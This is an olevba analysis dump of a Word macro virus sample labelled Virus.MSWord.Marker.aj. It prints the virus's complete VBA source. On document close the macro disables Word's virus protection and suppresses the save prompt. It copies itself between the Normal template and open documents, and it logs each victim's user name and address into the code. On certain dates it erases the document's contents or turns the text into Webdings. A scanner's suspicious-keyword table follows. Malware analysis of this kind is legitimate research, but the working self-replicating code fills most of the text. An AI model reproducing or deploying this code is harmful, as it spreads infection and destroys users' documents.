olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.aj-5f8d5169fdcb3c687bd9a630ff2eb85c16be1ccd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.aj-5f8d5169fdcb3c687bd9a630ff2eb85c16be1ccd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
              
    Dim SavDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
        
    Options.VirusProtection = False
    Const maker = "BLowMaster"
    Options.SaveNormalPrompt = False
    Const Oldmaker = "-> this is another maker!"
    Dim ad, nt As Object
    
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    
      
    
    DocumentInfected = ad.CodeModule.Find(maker, 1, 1, 10000, 10000)
    NormalTemplateInfected = nt.CodeModule.Find(maker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For I = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next I

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
            nt.CodeModule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SavDocument = ActiveDocument.Saved
    
            OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

            ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
            ad.CodeModule.AddFromString OurCode
    
            If SavDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = True
    
    
End Sub

' 01:15:14 PM - Wednesday, 16 Feb 2000
' MACRO
'



' 01:41:05 PM - Wednesday, 28 Feb 2001
' Tester
'


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

